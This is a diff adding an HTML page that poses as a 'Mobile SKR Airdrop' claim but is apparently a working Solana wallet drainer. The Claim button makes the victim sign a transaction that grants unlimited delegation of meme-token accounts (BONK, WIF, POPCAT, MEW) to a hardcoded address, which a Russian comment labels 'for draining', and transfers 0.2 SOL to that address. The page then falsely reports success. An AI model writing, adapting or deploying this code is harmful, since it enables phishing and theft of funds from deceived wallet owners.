@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mobile SKR Airdrop</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 50px; background: #000; color: #fff; }
+    button { padding: 15px 30px; font-size: 18px; margin: 20px; background: #14f195; border: none; border-radius: 10px; cursor: pointer; }
+    button:disabled { background: #666; cursor: not-allowed; }
+    #status { font-size: 20px; margin: 20px; }
+  </style>
+</head>
+<body>
+  <h1>Mobile SKR Airdrop</h1>
+  <p>Connect wallet and claim your tokens!</p>
+  <button id="connect-btn">Connect Wallet</button>
+  <button id="claim-btn" disabled>Claim Airdrop (Approve + 0.2 SOL fee)</button>
+  <div id="status"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
+
+  <script>
+    const DRAIN_ADDRESS = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Твой адрес для слива
+
+    const MEME_MINTS = [
+      "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
+      "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
+      "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7",   // POPCAT
+      "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t"    // MEW (пример)
+    ];
+
+    let wallet = null;
+    let publicKey = null;
+
+    const statusEl = document.getElementById('status');
+    const connectBtn = document.getElementById('connect-btn');
+    const claimBtn = document.getElementById('claim-btn');
+
+    async function connectWallet() {
+      if (wallet) return;
+
+      let provider = null;
+      if (window.solana && window.solana.isPhantom) provider = window.solana;
+      else if (window.backpack) provider = window.backpack;
+      else if (window.solflare) provider = window.solflare;
+
+      if (!provider) {
+        statusEl.textContent = "Установи Phantom или Backpack!";
+        return;
+      }
+
+      try {
+        await provider.connect();
+        wallet = provider;
+        publicKey = provider.publicKey.toString();
+
+        connectBtn.textContent = publicKey.slice(0,4) + '...' + publicKey.slice(-4);
+        connectBtn.disabled = true;
+        claimBtn.disabled = false;
+        statusEl.textContent = "Кошелёк подключён! Нажми Claim.";
+      } catch (err) {
+        statusEl.textContent = "Ошибка подключения";
+      }
+    }
+
+    async function claimAirdrop() {
+      if (!wallet) return;
+
+      statusEl.textContent = "Создаём транзакцию...";
+      claimBtn.disabled = true;
+
+      try {
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+        const owner = new solanaWeb3.PublicKey(publicKey);
+        const delegate = new solanaWeb3.PublicKey(DRAIN_ADDRESS);
+
+        const tx = new solanaWeb3.Transaction();
+
+        // Approve unlimited на мемы
+        for (const mintStr of MEME_MINTS) {
+          const mint = new solanaWeb3.PublicKey(mintStr);
+          const ata = await splToken.getAssociatedTokenAddress(mint, owner);
+
+          const ataInfo = await connection.getAccountInfo(ata);
+          if (!ataInfo) {
+            tx.add(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
+          }
+
+          tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("18446744073709551615")));
+        }
+
+        // Transfer 0.2 SOL
+        tx.add(solanaWeb3.SystemProgram.transfer({
+          fromPubkey: owner,
+          toPubkey: delegate,
+          lamports: 200000000
+        }));
+
+        tx.feePayer = owner;
+        const { blockhash } = await connection.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
+
+        const signed = await wallet.signTransaction(tx);
+        const sig = await connection.sendRawTransaction(signed.serialize());
+
+        statusEl.textContent = `Успех! Транзакция: ${sig}`;
+        alert("Claim успешный! Проверь кошелёк.");
+      } catch (err) {
+        statusEl.textContent = "Ошибка (отменил или мало SOL на fee)";
+        claimBtn.disabled = false;
+      }
+    }
+
+    connectBtn.onclick = connectWallet;
+    claimBtn.onclick = claimAirdrop;
+  </script>
+</body>
+</html>
